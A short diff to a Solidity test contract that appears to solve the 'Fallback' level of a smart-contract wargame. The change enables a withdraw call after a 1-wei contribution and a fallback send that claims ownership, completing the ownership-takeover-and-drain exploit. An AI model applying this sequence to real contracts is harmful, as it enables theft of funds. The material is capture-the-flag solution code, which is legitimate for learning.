@@ -36,7 +36,7 @@ contract FallbackTest is LevelFactory {
     fallbhack.contribute.value(1 wei)(); // Just add a contribution
     (bool worked,) = payable(address(fallbhack)).call.value(1 wei)(""); // Claim ownership
     assert(worked);
-    // fallbhack.withdraw(); // Withdraw funds
+    fallbhack.withdraw(); // Withdraw funds
     /* Write your code here */ 
   }
 
